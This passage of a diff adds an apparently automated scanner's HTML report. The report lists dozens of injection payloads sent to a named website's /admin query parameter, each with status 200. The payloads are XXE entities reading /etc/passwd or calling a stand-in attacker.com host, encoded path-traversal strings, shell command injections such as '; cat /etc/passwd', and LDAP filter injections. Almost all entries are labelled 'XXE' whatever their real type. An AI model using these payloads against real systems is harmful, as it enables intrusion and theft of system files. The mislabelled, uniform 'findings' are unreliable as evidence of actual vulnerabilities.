+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;jar:file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22jar%3Afile%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 465ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;gopher://attacker.com/steal&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22gopher%3A%2F%2Fattacker.com%2Fsteal%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 475ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 434ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">../etc/passwd</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=..%2Fetc%2Fpasswd</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 438ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">..\..\..\windows\system32\drivers\etc\hosts</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 438ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">....//....//....//etc/passwd</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 450ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">..%2F..%2F..%2Fetc%2Fpasswd</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=..%252F..%252F..%252Fetc%252Fpasswd</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 519ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">..%252F..%252F..%252Fetc%252Fpasswd</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=..%25252F..%25252F..%25252Fetc%25252Fpasswd</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 448ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">..%c0%af..%c0%af..%c0%afetc%c0%afpasswd</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 467ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=..%25c1%259c..%25c1%259c..%25c1%259cetc%25c1%259cpasswd</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 444ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">/etc/passwd%00</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2Fetc%2Fpasswd%2500</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 420ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">/etc/passwd%00.txt</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2Fetc%2Fpasswd%2500.txt</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 464ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">..\..\..\..\..\..\..\..\..\..\etc\passwd</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 443ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">..\..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 445ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">; ls -la</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3B+ls+-la</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 486ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">| ls -la</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7C+ls+-la</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 455ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">` ls -la `</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%60+ls+-la+%60</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 466ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&amp; ls -la</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%26+ls+-la</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 482ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">$( ls -la )</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%24%28+ls+-la+%29</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 478ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">; cat /etc/passwd</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3B+cat+%2Fetc%2Fpasswd</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 441ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">| cat /etc/passwd</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7C+cat+%2Fetc%2Fpasswd</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 452ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">` cat /etc/passwd `</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%60+cat+%2Fetc%2Fpasswd+%60</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 415ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">$( cat /etc/passwd )</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%24%28+cat+%2Fetc%2Fpasswd+%29</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 510ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">; whoami</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3B+whoami</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 508ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&amp; cat /etc/passwd</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%26+cat+%2Fetc%2Fpasswd</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 691ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">| whoami</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7C+whoami</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 448ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&amp; whoami</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%26+whoami</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 440ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">` whoami `</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%60+whoami+%60</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 444ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">$( whoami )</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%24%28+whoami+%29</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 439ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">| id</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7C+id</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 451ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">; id</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3B+id</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 491ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&amp; id</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%26+id</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 438ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">` id `</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%60+id+%60</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 437ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">$( id )</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%24%28+id+%29</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 465ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">; uname -a</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3B+uname+-a</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 437ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">| uname -a</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7C+uname+-a</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 437ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">` uname -a `</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%60+uname+-a+%60</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 444ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&amp; uname -a</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%26+uname+-a</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 462ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">$( uname -a )</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%24%28+uname+-a+%29</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 441ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XSS</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 412ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(&amp;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%26</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 447ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 505ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(objectClass=*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28objectClass%3D%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 422ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(objectClass=user</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28objectClass%3Duser</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 429ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(objectClass=group</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28objectClass%3Dgroup</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 460ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(cn=*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28cn%3D%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 476ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(mail=*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28mail%3D%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 441ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(uid=*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28uid%3D%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 445ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(sAMAccountName=*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28sAMAccountName%3D%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 438ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(member=*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28member%3D%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 486ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(memberOf=*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28memberOf%3D%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 467ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(objectCategory=*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28objectCategory%3D%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 425ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(objectSid=*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28objectSid%3D%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 446ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">*)(|(objectGUID=*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%2A%29%28%7C%28objectGUID%3D%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 450ms</p>
+    </div>
+</body>
+</html>
